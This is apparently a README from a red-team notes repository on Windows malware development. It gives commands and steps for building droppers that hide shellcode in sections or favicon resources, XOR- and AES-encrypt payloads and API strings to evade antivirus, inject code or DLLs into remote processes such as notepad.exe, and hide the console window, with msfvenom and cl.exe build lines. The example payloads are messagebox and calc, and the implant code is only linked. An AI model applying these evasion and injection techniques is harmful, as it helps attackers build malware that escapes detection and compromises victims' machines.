# Malware Development

* [General](#General)
* [Storing payload](#Storing-payload)
* [Payload encoding & encryption](#Payload-encoding-&-encryption)
  * [Encoding](#Encoding)
    * [Base64](#Base64)
  * [Encryption](#Encryption)
    * [XOR](#XOR)
    * [AES](#AES)
* [Function call obfuscation](#Function-call-obfuscation)
* [Code injection](#Code-injection)
  * [Classic Injections](#Classic-Injections)
    * [Injecting code in remote process](#Injecting-code-in-remote-process)
    * [Injecting DLL in remote process](#Injecting-DLL-in-remote-process)
* [Making a program invisible](#Making-a-program-invisible)
* [Combined Droppers](#Combined-Droppers)
  * [Dropper AES Favicon](#Dropper_AES_Favicon) 
  * [Dropper XOR Favicon](#Dropper_XOR_Favicon)

## General
- For building start `x86_x64 Cross Tools Command Promt for VS 2019`

## Storing payload
- Payloads in droppers can be stored in
	- `.text`, put it inside a function in the code. For example within main.
	- `.data`, set payload read only, inside global variable
	- `.rsrc`, place it in a icon, or image.

#### Example payload in text
- [Link](cplusplus/Basics/implant_text/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Example payload in data
- [Link](cplusplus/Basics/implant_data/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Example payload in resources
- Requires a `.ico` payload generated (calc.ico in example)
- [Link](cplusplus/Basics/implant_src/implant.cpp)

##### Build
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o
```

## Payload encoding & encryption
- Encoding: Mostly used for transfering binary data, for example in Base64
- Encryption: Transform data with a key, for example XOR, AES

### Encoding
### Base64
- Not enough to avoid detection. Mostly used for transfering binary data

#### Base64 encode payload
```
certutil -encode <PAYLOAD>.bin <PAYLOAD>.base64
```

#### Example base64 encoded payload
- [Link](cplusplus/Basics/Encoding_Encryption/Base64/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

### Encryption
### XOR
#### Xor encrypt payload python2
- Change the `KEY` variable with a key
- Xor encrypts a `.bin` file
- [Link](cplusplus/Basics/Encoding_Encryption/Xor/xorencrypt.py)

```
python2 xorencrypt.py msgbox64.bin
```

#### Example with XOR encrypted payload
- Change the `key` variable with the key
- [Link](cplusplus/Basics/Encoding_Encryption/Xor/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

#### Xor encrypt favicon.ico python2
- Change the `KEY` variable with a key
- [Link](cplusplus/Basics/Encoding_Encryption/Xor/xorencryptfavicon.py)

```
python2 xorencryptfavicon.py msgbox64.bin
```

### AES
#### AES encrypt python2
- AES encrypts a `.bin` file
- [Link](cplusplus/Basics/Encoding_Encryption/AES/aesencrypt.py)

```
python2 aesencrypt.py calc.bin
```

#### Example with AES encrypted payload
- Change the `key` variable with the key
- [Link](cplusplus/Basics/Encoding_Encryption/AES/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

## Function call obfuscation
- Calling external functions, detection based on imported DLLs and functions
- A method of hiding DLL's and external functions that are called during runtime.
	- With the API's `GetModuleHandle` & `GetProcAddress`

#### Run dumpbin to check import adress table
- Prints the imported DLLs and the functions
```
dumpbin /import <PAYLOAD EXE>
```

#### Lookup function
- For example: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect and copy the declaration.
  - Check which DLL its imported from
```
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

#### Create global variable
- Create a global variable and make it a pointer
```
BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
```

#### Add the following code
- Add the following line to get the address of the pointer
```
pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
```

- Best is to encrypt the string `VirtualProtect` from the example above and decode it in the code. See Droppers for example code
  - [AES](cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp)
  - [XOR](cplusplus/Dropper_XOR_Favicon_Notepad/implant.cpp)

## Code injection
- Why do code injection?
	- Escape from a short lived process
	- Change working context
	- Backup C2 channel (Toon, two is one, one is none)
- Classic methods: Shellcode/payload injection w/ debugging Win API or DLL injection

### Classic Injections
### Injecting code in remote process
- Win32 API functions:
	- `VirtualAllocEx` Allocate memory buffer in remote process
	- `WriteProcessMemory` Write into memory into the remote process
	- `CreateRemoteThread` Specify which process should start the new threat

#### Example Code injection notepad.exe
- [Link](cplusplus/Basics/Code_Injection/Remote_Process/implant.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

### Injecting DLL in remote process
- Win32 API functions:
	- `GetProcAddress` Get Loadlibrary address from the dropper
	- `VirtualAllocEx` Allocate memory buffer in remote process [link](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
	- `WriteProcessMemory` Write DLL Address into the memory of remote process
	- `CreateRemoteThread` Specify which process should start the new threat

#### Example dll
- [Link](cplusplus/Basics/Code_Injection/Remote_Process_DLL/implantDLL.cpp)

##### Build
```
cl.exe /O2 /D_USRDLL /D_WINDLL implantDLL.cpp implantDLL.def /MT /link /DLL /OUT:implantDLL.dll
```

#### Example Dropper
- [Link](cplusplus/Basics/Code_Injection/Remote_Process_DLL/injectDLL.cpp)

##### Build
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TcinjectDLL.cpp /link /OUT:injectDLL.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
```

## Making a program invisible
- Two typical ways: `Freeconsole()` (Console window shows up a split second) and `GUItrick`

#### Example GUItrick
- Instead of the `main` function create a `WinMain` function

```
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
```

- [Example code](cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp) where its being used.

##### Build
- Use `/SUBSYSTEM:WINDOWS`
```
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64
```

## Combined Droppers
### Dropper XOR Favicon
- [Link](cplusplus/Dropper_XOR_Favicon_Notepad/implant.cpp)

#### Generate messagebox
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### XOR encrypt messagebox
- Change the key in script if desired
```
python2 xorencryptfavicon.py msgbox64.bin
```

#### XOR encrypt function calls / strings
- Might want to change the function for this
```
python2 -i xorencrypt.py

>>> PrintC(xor("<STRING TO ENCRYPT>", "<KEY">)
```

#### See implant.cpp
- [Link](cplusplus/Dropper_XOR_Favicon_Notepad/implant.cpp)

#### Compile
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
```

### Dropper AES Favicon
- [Link](cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp)

#### Generate messagebox
```
msfvenom -p windows/x64/messagebox TEXT="0xjs" -o msgbox64.bin
```

#### AES encrypt messagebox
- Change the key in script if desired
```
python.exe .\aesencryptfile.py .\msgbox64.bin
```

#### AES encrypt function calls / strings
- Might want to change the function for this
```
python.exe .\aesencryptstring.py
```

#### See implant.cpp
- [Link](cplusplus/Dropper_AES_Favicon_Notepad/implant.cpp)

#### Compile
```
rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o
```
